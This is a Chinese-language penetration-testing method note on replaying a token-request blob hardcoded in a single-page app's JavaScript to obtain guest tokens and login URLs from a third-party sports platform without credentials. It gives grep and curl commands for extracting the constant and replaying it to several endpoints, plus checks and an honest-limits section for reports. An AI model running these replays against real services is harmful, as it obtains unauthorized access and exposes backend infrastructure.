# 「前端硬编码 requestData 常量重放 → 未授权签发第三方平台 token」通用手法

## 原理
白标/供应商型 SPA 常把"取 guest token"的加密请求体**硬编码在前端 JS 里**（因为它对所有用户都一样）。
前端只做"原样发出"，不需要本地加密 → **任何人复制该常量即可重放**，无需凭据、无需逆出密钥。

## 定位常量
```bash
# 1) 拿主包（HTML 里 modulepreload / preload as=script 的那个 index-*.js）
curl -s https://TARGET/ | grep -oE '/assets/[A-Za-z0-9_.-]+\.js'
# 2) 找 fakerToken / getToken / getTryToken 的调用点，抽出 requestData 常量
grep -oE '(FAKER_TOKEN|FAKER_TOKEN_BASE_URL)[^;]{0,400}' index.js
grep -oE 'requestData:"([A-Za-z0-9+/=]{40,})"' index.js
# 3) 取服务地址：grep -oE 'FAKER_TOKEN_BASE_URL:"[^"]+"' index.js
```

## 重放（关键：绝大多数这类服务**只认 form 编码**，json 会返回业务错误）
```bash
BASE='https://<FAKER_TOKEN_BASE_URL 的域名>'
BLOB='<上一步抽出的 requestData 值>'

# A) 签 guest 体育 token（返回 token / userId / loginUrl / sessionId / apiDomainList）
curl -sk -X POST "$BASE/ob/v2/getTryToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'product=rb' --data-urlencode "requestData=$BLOB"

# B) 取线路后端域名路由表（12 组 / 20 个域名，含 wss 推送、H5、PC、静态、播放器、订单详情、API）
curl -sk -X POST "$BASE/fbsport/v1/getToken" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=$BLOB"

# C) 若还有 /common/v1/* 数据接口，同法重放
curl -sk -X POST "$BASE/common/v1/hotLegues/getHotLegues" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "requestData=$BLOB"
```

## 判定要点
- **token 是否恒定**：连打 3 次，若 token/userId 完全一致、仅 sessionId（=userId+毫秒戳+计数）递增
  → 是**固定静态凭据**，写在公开 JS 里被所有用户共享；
- **能否指定他人身份**：追加 `userId/uid/obUserId` 参数，若返回业务错误（无法指定）→ 不能拿别人身份；
- **该 token 能否反向认证业务后端**：用 header `token` / `token_x` / `Authorization: Bearer` / `Cookie` 四类
  注入方式打业务站的鉴权接口（如 /api/refreshUserInSession），若全部返回"未登录"→ **不构成业务后端认证绕过**。

## 如实边界（照抄进报告，勿夸大）
- token 能否在第三方平台**真正建立登录会话未实测**（loginUrl 指向真实账号会话，不应打开）；
- 已验证的只是"未认证即可获取该 token 与可直接登录的 URL + sessionId"以及"token 为固定值"；
- **不构成资金/业务后端的认证绕过**（实测业务后端不认该 token）。
